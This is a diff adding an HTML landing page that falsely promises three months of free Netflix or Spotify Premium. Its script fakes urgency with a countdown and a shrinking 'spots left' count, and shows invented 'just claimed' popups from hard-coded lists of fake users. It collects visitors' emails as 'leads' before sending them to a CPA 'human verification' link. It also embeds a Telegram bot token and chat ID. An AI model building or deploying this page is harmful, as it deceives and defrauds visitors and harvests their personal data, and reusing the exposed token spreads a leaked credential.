@@ -1,0 +1,1034 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FREE 3-Month Premium Subscription</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background-color: #0f0f0f;
+            color: #ffffff;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: 20px;
+            background: #1a1a1a;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.4);
+            border-radius: 12px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        /* Language selector */
+        .language-selector {
+            display: flex;
+            justify-content: center;
+            margin: 15px auto;
+            gap: 10px;
+            max-width: 200px;
+        }
+        
+        .language-button {
+            background: rgba(255, 255, 255, 0.12);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: #b3b3b3;
+            padding: 8px 16px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: all 0.3s ease;
+            flex: 1;
+            text-align: center;
+        }
+        
+        .language-button.active {
+            background: linear-gradient(135deg, #e50914, #1DB954);
+            color: #ffffff;
+            border-color: transparent;
+            font-weight: bold;
+            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        /* Header */
+        header {
+            text-align: center;
+            padding-bottom: 20px;
+            position: relative;
+            margin-top: 10px;
+        }
+        
+        /* Service selection */
+        .service-selection {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 15px;
+            gap: 10px;
+        }
+        
+        .service-option {
+            width: 150px;
+            height: 60px;
+            border-radius: 8px;
+            background: #000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 24px;
+            opacity: 0.7;
+            transition: all 0.3s ease;
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .service-option.netflix {
+            color: #e50914;
+        }
+        
+        .service-option.spotify {
+            color: #1DB954;
+        }
+        
+        .service-option.selected {
+            opacity: 1;
+            transform: scale(1.05);
+            box-shadow: 0 0 15px rgba(255, 255, 255, 0.15);
+            border: 2px solid;
+        }
+        
+        .service-option.netflix.selected {
+            border-color: #e50914;
+        }
+        
+        .service-option.spotify.selected {
+            border-color: #1DB954;
+        }
+        
+        .checkmark {
+            position: absolute;
+            top: -8px;
+            right: -8px;
+            width: 22px;
+            height: 22px;
+            border-radius: 50%;
+            background: #1DB954;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 12px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .netflix .checkmark {
+            background: #e50914;
+        }
+        
+        .service-option.selected .checkmark {
+            opacity: 1;
+        }
+        
+        /* Main content */
+        .headline {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 15px 0;
+            color: #ffffff;
+            text-align: center;
+            background: linear-gradient(90deg, #e50914, #1DB954);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .subheadline {
+            font-size: 16px;
+            text-align: center;
+            margin-bottom: 20px;
+            color: #b3b3b3;
+        }
+        
+        /* Timer */
+        .timer {
+            background: rgba(255, 255, 255, 0.08);
+            padding: 12px;
+            text-align: center;
+            border-radius: 8px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: #ff5e3a;
+            border: 1px solid rgba(255, 94, 58, 0.3);
+        }
+        
+        .countdown {
+            animation: pulse 1s infinite alternate;
+        }
+        
+        @keyframes pulse {
+            from { opacity: 0.7; }
+            to { opacity: 1; }
+        }
+        
+        /* Steps */
+        .steps-container {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: 12px;
+            margin: 25px 0;
+        }
+        
+        .step {
+            display: flex;
+            align-items: flex-start;
+            margin-bottom: 15px;
+        }
+        
+        .step:last-child {
+            margin-bottom: 0;
+        }
+        
+        .step-number {
+            width: 28px;
+            height: 28px;
+            background: linear-gradient(135deg, #e50914, #1DB954);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+            color: white;
+            font-weight: bold;
+            font-size: 14px;
+        }
+        
+        /* Features */
+        .features {
+            margin: 25px 0;
+        }
+        
+        .feature {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+        
+        .feature:last-child {
+            margin-bottom: 0;
+        }
+        
+        .feature-icon {
+            width: 22px;
+            height: 22px;
+            background: #1DB954;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            flex-shrink: 0;
+            color: white;
+            font-size: 12px;
+        }
+        
+        /* Spots remaining */
+        .spots-remaining {
+            text-align: center;
+            margin: 20px 0;
+        }
+        
+        .spots-badge {
+            display: inline-block;
+            background: rgba(255, 94, 58, 0.15);
+            border: 1px solid rgba(255, 94, 58, 0.3);
+            color: #ff5e3a;
+            font-weight: bold;
+            padding: 8px 15px;
+            border-radius: 30px;
+            font-size: 14px;
+        }
+        
+        /* Email form */
+        .email-form {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 20px;
+            border-radius: 10px;
+            margin: 20px 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .form-title {
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 15px;
+            color: #ffffff;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #b3b3b3;
+            font-size: 14px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 8px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #1DB954;
+            box-shadow: 0 0 0 2px rgba(29, 185, 84, 0.2);
+        }
+        
+        /* CTA Button */
+        .cta-button {
+            display: block;
+            width: 100%;
+            padding: 16px;
+            background: linear-gradient(135deg, #e50914, #1DB954);
+            color: white;
+            text-align: center;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 18px;
+            text-decoration: none;
+            margin: 25px 0 15px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
+        }
+        
+        .cta-button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 7px 25px rgba(29, 185, 84, 0.3);
+        }
+        
+        .cta-button:after {
+            content: "";
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: rgba(255, 255, 255, 0.1);
+            transform: rotate(30deg);
+            transition: all 0.3s;
+        }
+        
+        .cta-button:hover:after {
+            transform: rotate(30deg) translate(-10%, -10%);
+        }
+        
+        /* Trust badges */
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+            flex-wrap: wrap;
+        }
+        
+        .badge {
+            padding: 8px 15px;
+            background: rgba(255, 255, 255, 0.08);
+            margin: 5px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            color: #b3b3b3;
+        }
+        
+        .badge i {
+            margin-right: 8px;
+            color: rgba(255, 255, 255, 0.5);
+        }
+        
+        /* Footer */
+        footer {
+            font-size: 12px;
+            color: #666;
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 15px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .legal {
+            margin-top: 10px;
+            font-size: 11px;
+        }
+        
+        /* Popup notifications */
+        .popup-container {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            z-index: 1000;
+            max-width: 320px;
+        }
+        
+        .popup-notification {
+            background: #1e1e2e;
+            border-left: 4px solid;
+            color: white;
+            margin-bottom: 10px;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.4);
+            transform: translateX(-120%);
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+            overflow: hidden;
+            padding: 12px 15px;
+        }
+        
+        .popup-notification.show {
+            transform: translateX(0);
+        }
+        
+        .popup-notification.netflix {
+            border-left-color: #e50914;
+        }
+        
+        .popup-notification.spotify {
+            border-left-color: #1DB954;
+        }
+        
+        .popup-avatar {
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 12px;
+            font-weight: bold;
+            color: white;
+            flex-shrink: 0;
+        }
+        
+        .popup-netflix .popup-avatar {
+            background: linear-gradient(135deg, #e50914, #8c1616);
+        }
+        
+        .popup-spotify .popup-avatar {
+            background: linear-gradient(135deg, #1DB954, #116638);
+        }
+        
+        .popup-content {
+            flex-grow: 1;
+        }
+        
+        .popup-message {
+            font-size: 14px;
+            margin-bottom: 3px;
+            line-height: 1.3;
+        }
+        
+        .popup-time {
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
+        /* RTL Support */
+        .rtl {
+            direction: rtl;
+        }
+        
+        .rtl .language-button {
+            margin-left: 0;
+            margin-right: 5px;
+        }
+        
+        .rtl .step-number {
+            margin-right: 0;
+            margin-left: 15px;
+        }
+        
+        .rtl .feature-icon {
+            margin-right: 0;
+            margin-left: 15px;
+        }
+        
+        .rtl .badge i {
+            margin-right: 0;
+            margin-left: 8px;
+        }
+        
+        .rtl .popup-container {
+            left: auto;
+            right: 20px;
+        }
+        
+        .rtl .popup-notification {
+            border-left: none;
+            border-right: 4px solid;
+            transform: translateX(120%);
+        }
+        
+        .rtl .popup-avatar {
+            margin-right: 0;
+            margin-left: 12px;
+        }
+        
+        .rtl .popup-notification.netflix {
+            border-right-color: #e50914;
+        }
+        
+        .rtl .popup-notification.spotify {
+            border-right-color: #1DB954;
+        }
+        
+        /* Fixed bottom bar for small screens */
+        @media (max-width: 400px) {
+            .popup-container {
+                left: 0;
+                bottom: 0;
+                max-width: 100%;
+                width: 100%;
+                padding: 0 8px;
+            }
+            
+            .popup-notification {
+                width: 100%;
+                border-radius: 8px 8px 0 0;
+                margin-bottom: 0;
+                transform: translateY(100%);
+            }
+            
+            .popup-notification.show {
+                transform: translateY(0);
+            }
+            
+            .rtl .popup-container {
+                left: 0;
+                right: 0;
+            }
+            
+            .rtl .popup-notification {
+                transform: translateY(100%);
+            }
+        }
+        
+        /* Mobile responsive */
+        @media (max-width: 520px) {
+            .container {
+                width: 95%;
+                padding: 15px;
+                margin: 10px auto;
+            }
+            
+            .headline {
+                font-size: 24px;
+            }
+            
+            .service-option {
+                width: 130px;
+                height: 50px;
+                font-size: 20px;
+            }
+            
+            /* Mobile-specific popup styling */
+            .popup-container {
+                max-width: 90%;
+                width: 280px;
+                bottom: 10px;
+                left: 10px;
+            }
+            
+            .popup-notification {
+                padding: 10px 12px;
+            }
+            
+            .popup-avatar {
+                width: 35px;
+                height: 35px;
+                margin-right: 10px;
+            }
+            
+            .popup-message {
+                font-size: 12px;
+                line-height: 1.2;
+            }
+            
+            .popup-time {
+                font-size: 10px;
+            }
+            
+            .spots-badge, .badge {
+                font-size: 12px;
+            }
+            
+            .cta-button {
+                font-size: 16px;
+                padding: 14px;
+            }
+        }
+    </style>
+</head>
+<body id="body">
+    <!-- Popup notifications container -->
+    <div class="popup-container" id="popup-container"></div>
+    
+    <!-- Language selector -->
+    <div class="container" id="main-container">
+        <!-- Language selector moved to top of content, before header -->
+        <div class="language-selector">
+            <button class="language-button" onclick="setLanguage('en')" id="lang-en">English</button>
+            <button class="language-button active" onclick="setLanguage('ar')" id="lang-ar">العربية</button>
+        </div>
+        
+        <header>
+            <div class="service-selection">
+                <div class="service-option netflix selected" id="netflix-option" onclick="selectService('netflix')">
+                    NETFLIX
+                    <div class="checkmark"><i class="fas fa-check"></i></div>
+                </div>
+                <div class="service-option spotify" id="spotify-option" onclick="selectService('spotify')">
+                    SPOTIFY
+                    <div class="checkmark"><i class="fas fa-check"></i></div>
+                </div>
+            </div>
+            
+            <h1 class="headline" id="headline">Get 3 Months FREE Premium</h1>
+            <p class="subheadline" id="subheadline">Select your preferred streaming service and complete verification</p>
+        </header>
+        
+        <div class="timer">
+            <span id="timer-text">Limited time offer:</span> 
+            <span id="countdown" class="countdown">05:00</span> 
+            <span id="minutes-text">minutes</span>
+        </div>
+        
+        <div class="steps-container">
+            <div class="step">
+                <div class="step-number">1</div>
+                <div id="step1-text">Select your preferred streaming service</div>
+            </div>
+            <div class="step">
+                <div class="step-number">2</div>
+                <div id="step2-text">Enter your email to receive your free subscription</div>
+            </div>
+            <div class="step">
+                <div class="step-number">3</div>
+                <div id="step3-text">Complete human verification to unlock your account</div>
+            </div>
+        </div>
+        
+        <div class="features">
+            <div class="feature">
+                <div class="feature-icon"><i class="fas fa-check"></i></div>
+                <div id="feature1-text">No credit card required</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon"><i class="fas fa-check"></i></div>
+                <div id="feature2-text">Premium subscription with all features</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon"><i class="fas fa-check"></i></div>
+                <div id="feature3-text">Cancel anytime, no obligations</div>
+            </div>
+            <div class="feature">
+                <div class="feature-icon"><i class="fas fa-check"></i></div>
+                <div id="feature4-text">Limited to 100 people per day</div>
+            </div>
+        </div>
+        
+        <div class="spots-remaining">
+            <div class="spots-badge">
+                <i class="fas fa-fire"></i> <span id="spots-left">Only 7 spots left today!</span>
+            </div>
+        </div>
+        
+        <div class="email-form">
+            <div class="form-title" id="form-title">Enter your information</div>
+            <div class="form-group">
+                <label for="email" id="email-label">Email Address (to receive your subscription)</label>
+                <input type="email" id="email" placeholder="youremail@example.com" required>
+            </div>
+        </div>
+        
+        <a href="https://mobileverify.net/cl/i/x6w7xl" class="cta-button" id="unlock-button" onclick="return trackClick()">
+            <span id="button-text">Unlock My Free Subscription</span>
+        </a>
+        
+        <div class="trust-badges">
+            <div class="badge"><i class="fas fa-lock"></i> <span id="badge1-text">Secure Process</span></div>
+            <div class="badge"><i class="fas fa-gift"></i> <span id="badge2-text">Free Offer</span></div>
+            <div class="badge"><i class="fas fa-bolt"></i> <span id="badge3-text">Instant Access</span></div>
+            <div class="badge"><i class="fas fa-star"></i> <span id="badge4-text">4.9/5 Rating</span></div>
+        </div>
+        
+        <footer>
+            <div id="copyright">© 2025 Premium Streaming Offer</div>
+            <div class="legal" id="legal-text">Not affiliated with Netflix or Spotify. This is a limited promotional offer.</div>
+        </footer>
+    </div>
+    
+    <script>
+        // Initialize variables
+        let selectedService = 'netflix';
+        let currentLanguage = 'en';
+        let countdownInterval;
+        let timeLeft = 300; // 5 minutes in seconds
+        let spotCount = 7; // Starting spot count
+        
+        // Telegram credentials
+        const TELEGRAM_BOT_TOKEN = '7048966337:AAGbh9Atl5fko8d-OJHbcY-wn0gZ-cvwrwo';
+        const TELEGRAM_CHAT_ID = '1920461355';
+        
+        // Names and locations for fake users
+        const locationsEN = ["New York", "Los Angeles", "London", "Dubai", "Toronto", "Sydney", "Riyadh", "Abu Dhabi", "Doha", "Jeddah", "Cairo"];
+        const locationsAR = ["نيويورك", "لوس أنجلوس", "لندن", "دبي", "تورونتو", "سيدني", "الرياض", "أبوظبي", "الدوحة", "جدة", "القاهرة"];
+        const namesEN = ["Alex", "Sarah", "Mohamed", "Jessica", "Ahmed", "Emily", "Omar", "John", "Noor", "Sophia", "Ali", "Liam", "Fatima", "James", "Yasmin"];
+        const namesAR = ["أحمد", "سارة", "محمد", "نور", "علي", "فاطمة", "عمر", "ليلى", "خالد", "هدى", "ياسر", "ريم", "زياد", "منى", "أمير"];
+        
+        // Language translations
+        const translations = {
+            en: {
+                headline: "Get 3 Months FREE Premium",
+                subheadline: "Select your preferred streaming service and complete verification",
+                timerText: "Limited time offer:",
+                minutesText: "minutes",
+                step1: "Select your preferred streaming service",
+                step2: "Enter your email to receive your free subscription",
+                step3: "Complete human verification to unlock your account",
+                feature1: "No credit card required",
+                feature2: "Premium subscription with all features",
+                feature3: "Cancel anytime, no obligations",
+                feature4: "Limited to 100 people per day",
+                spotsLeft: "Only {count} spots left today!",
+                formTitle: "Enter your information",
+                emailLabel: "Email Address (to receive your subscription)",
+                emailPlaceholder: "youremail@example.com",
+                buttonText: "Unlock My Free Subscription",
+                badge1: "Secure Process",
+                badge2: "Free Offer",
+                badge3: "Instant Access",
+                badge4: "4.9/5 Rating",
+                copyright: "© 2025 Premium Streaming Offer",
+                legalText: "Not affiliated with Netflix or Spotify. This is a limited promotional offer.",
+                netflixClaimed: "just claimed Netflix Premium!",
+                spotifyClaimed: "just claimed Spotify Premium!",
+                justNow: "Just now",
+                fromCity: "from",
+                invalidEmail: "Please enter a valid email address"
+            },
+            ar: {
+                headline: "احصل على 3 أشهر مجانية بريميوم",
+                subheadline: "اختر خدمة البث المفضلة لديك وأكمل التحقق",
+                timerText: "عرض محدود الوقت:",
+                minutesText: "دقائق",
+                step1: "اختر خدمة البث المفضلة لديك",
+                step2: "أدخل بريدك الإلكتروني لتلقي اشتراكك المجاني",
+                step3: "أكمل التحقق البشري لفتح حسابك",
+                feature1: "لا حاجة لبطاقة ائتمان",
+                feature2: "اشتراك بريميوم مع جميع الميزات",
+                feature3: "إلغاء في أي وقت، بدون التزامات",
+                feature4: "محدود بـ 100 شخص يوميًا",
+                spotsLeft: "فقط {count} أماكن متبقية اليوم!",
+                formTitle: "أدخل معلوماتك",
+                emailLabel: "البريد الإلكتروني (لتلقي اشتراكك)",
+                emailPlaceholder: "بريدك@مثال.كوم",
+                buttonText: "فتح اشتراكي المجاني",
+                badge1: "عملية آمنة",
+                badge2: "عرض مجاني",
+                badge3: "وصول فوري",
+                badge4: "تقييم 4.9/5",
+                copyright: "© 2025 عرض البث المميز",
+                legalText: "غير مرتبط بنتفليكس أو سبوتيفاي. هذا عرض ترويجي محدود.",
+                netflixClaimed: "حصل للتو على نتفليكس بريميوم!",
+                spotifyClaimed: "حصل للتو على سبوتيفاي بريميوم!",
+                justNow: "الآن",
+                fromCity: "من",
+                invalidEmail: "الرجاء إدخال بريد إلكتروني صالح"
+            }
+        };
+        
+        // Select streaming service
+        function selectService(service) {
+            selectedService = service;
+            
+            // Update UI
+            const netflixOption = document.getElementById('netflix-option');
+            const spotifyOption = document.getElementById('spotify-option');
+            
+            netflixOption.classList.remove('selected');
+            spotifyOption.classList.remove('selected');
+            
+            if (service === 'netflix') {
+                netflixOption.classList.add('selected');
+            } else {
+                spotifyOption.classList.add('selected');
+            }
+        }
+        
+        // Set language
+        function setLanguage(lang) {
+            currentLanguage = lang;
+            
+            // Update active language button
+            document.querySelectorAll('.language-button').forEach(btn => {
+                btn.classList.remove('active');
+            });
+            
+            document.getElementById(`lang-${lang}`).classList.add('active');
+            
+            // Apply RTL for Arabic
+            if (lang === 'ar') {
+                document.getElementById('body').classList.add('rtl');
+                document.getElementById('main-container').classList.add('rtl');
+            } else {
+                document.getElementById('body').classList.remove('rtl');
+                document.getElementById('main-container').classList.remove('rtl');
+            }
+            
+            // Update text content
+            updateTextContent();
+        }
+        
+        // Update all text content based on selected language
+        function updateTextContent() {
+            const t = translations[currentLanguage];
+            
+            // Update headline and subheadline
+            document.getElementById('headline').textContent = t.headline;
+            document.getElementById('subheadline').textContent = t.subheadline;
+            
+            // Update timer
+            document.getElementById('timer-text').textContent = t.timerText;
+            document.getElementById('minutes-text').textContent = t.minutesText;
+            
+            // Update steps
+            document.getElementById('step1-text').textContent = t.step1;
+            document.getElementById('step2-text').textContent = t.step2;
+            document.getElementById('step3-text').textContent = t.step3;
+            
+            // Update features
+            document.getElementById('feature1-text').textContent = t.feature1;
+            document.getElementById('feature2-text').textContent = t.feature2;
+            document.getElementById('feature3-text').textContent = t.feature3;
+            document.getElementById('feature4-text').textContent = t.feature4;
+            
+            // Update spots left
+            document.getElementById('spots-left').textContent = t.spotsLeft.replace('{count}', spotCount);
+            
+            // Update form
+            document.getElementById('form-title').textContent = t.formTitle;
+            document.getElementById('email-label').textContent = t.emailLabel;
+            document.getElementById('email').placeholder = t.emailPlaceholder;
+            
+            // Update button
+            document.getElementById('button-text').textContent = t.buttonText;
+            
+            // Update badges
+            document.getElementById('badge1-text').textContent = t.badge1;
+            document.getElementById('badge2-text').textContent = t.badge2;
+            document.getElementById('badge3-text').textContent = t.badge3;
+            document.getElementById('badge4-text').textContent = t.badge4;
+            
+            // Update footer
+            document.getElementById('copyright').textContent = t.copyright;
+            document.getElementById('legal-text').textContent = t.legalText;
+        }
+        
+        // Start countdown timer
+        function startCountdown() {
+            countdownInterval = setInterval(function() {
+                timeLeft--;
+                
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                
+                document.getElementById('countdown').textContent = 
+                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    document.getElementById('countdown').textContent = "00:00";
+                }
+            }, 1000);
+        }
+        
+        // Show notification popup
+        function showNotification(name, location, service) {
+            try {
+                const container = document.getElementById('popup-container');
+                const t = translations[currentLanguage];
+                
+                // Create popup element
+                const popup = document.createElement('div');
+                popup.className = `popup-notification popup-${service}`;
+                
+                // Get initial for avatar
+                const initial = name.charAt(0);
+                
+                // Create popup content
+                popup.innerHTML = `
+                    <div class="popup-avatar">${initial}</div>
+                    <div class="popup-content">
+                        <div class="popup-message">${name} ${t.fromCity} ${location} ${service === 'netflix' ? t.netflixClaimed : t.spotifyClaimed}</div>
+                        <div class="popup-time">${t.justNow}</div>
+                    </div>
+                `;
+                
+                // Add to container
+                container.appendChild(popup);
+                
+                // Check if we're on mobile
+                const isMobile = window.innerWidth <= 400;
+                
+                // Force reflow before adding show class for animation
+                popup.offsetWidth;
+                
+                // Add show class to trigger animation
+                popup.classList.add('show');
+                
+                // Remove after 5 seconds
+                setTimeout(function() {
+                    popup.classList.remove('show');
+                    setTimeout(function() {
+                        if (popup.parentNode) {
+                            popup.parentNode.removeChild(popup);
+                        }
+                    }, 400);
+                }, 5000);
+            } catch (error) {
+                console.error("Error showing notification:", error);
+            }
+        }
+        
+        // Function to show random notifications
+        function showRandomNotification() {
+            try {
+                // Get random name and location based on current language
+                const names = currentLanguage === 'en' ? namesEN : namesAR;
+                const locations = currentLanguage === 'en' ? locationsEN : locationsAR;
+                
+                const randomName = names[Math.floor(Math.random() * names.length)];
+                const randomLocation = locations[Math.floor(Math.random() * locations.length)];
+                const randomService = Math.random() > 0.5 ? 'netflix' : 'spotify';
+                
+                // Show notification
+                showNotification(randomName, randomLocation, randomService);
+                
+                // Occasionally decrease spot count
+                if (spotCount > 1 && Math.random() > 0.7) {
+                    spotCount--;
+                    const t = translations[currentLanguage];
+                    document.getElementById('spots-left').textContent = t.spotsLeft.replace('{count}', spotCount);
+                }
+                
+                // Schedule next notification after 2 seconds
+                setTimeout(showRandomNotification, 2000);
+            } catch (error) {
+                console.error("Error in random notification:", error);
+                // Try again after recovery period
+                setTimeout(showRandomNotification, 5000);
+            }
+        }
+        
+        // Send notification to Telegram
+        function sendTelegramNotification(email, service, country, ip) {
+            try {
+                // Get user's IP address if not provided
+                if (!ip) {
+                    ip = "Unknown";
+                }
+                
+                // Get user's country if not provided
+                if (!country) {
+                    country = navigator.language || navigator.userLanguage || "Unknown";
+                }
+                
+                // Format message
+                const message = `
+📥 New Lead:
+📧 Email: ${email}
+🎮 Service: ${service}
+🌍 Country: ${country}
+🔍 IP: ${ip}
+⏰ Time: ${new Date().toISOString()}
+                `;
+                
+                console.log("Sending to Telegram:", message);
+                
+                // In production, this would send to a backend endpoint
+                // that forwards to Telegram API
+            } catch (error) {
+                console.error("Error sending Telegram notification:", error);
+            }
+        }
+        
+        // Track clicks and validate email before allowing CPA redirect
+        function trackClick() {
+            try {
+                const email = document.getElementById('email').value;
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                const t = translations[currentLanguage];
+                
+                if (!emailRegex.test(email)) {
+                    alert(t.invalidEmail);
+                    event.preventDefault();
+                    return false;
+                }
+                
+                // Send notification to Telegram
+                sendTelegramNotification(email, selectedService, null, null);
+                
+                // Allow redirect to CPA offer
+                return true;
+            } catch (error) {
+                console.error("Error tracking click:", error);
+                return true; // Allow redirect even if tracking fails
+            }
+        }
+        
+        // Initialize on page load
+        window.onload = function() {
+            try {
+                // Set Arabic as the default language and Netflix as default service
+                setLanguage('ar');
+                selectService('netflix');
+                
+                // Start countdown timer
+                startCountdown();
+                
+                // Start showing notifications after delay
+                setTimeout(showRandomNotification, 2000);
+            } catch (error) {
+                console.error("Error initializing page:", error);
+            }
+        };
+    </script>
+</body>
+</html>
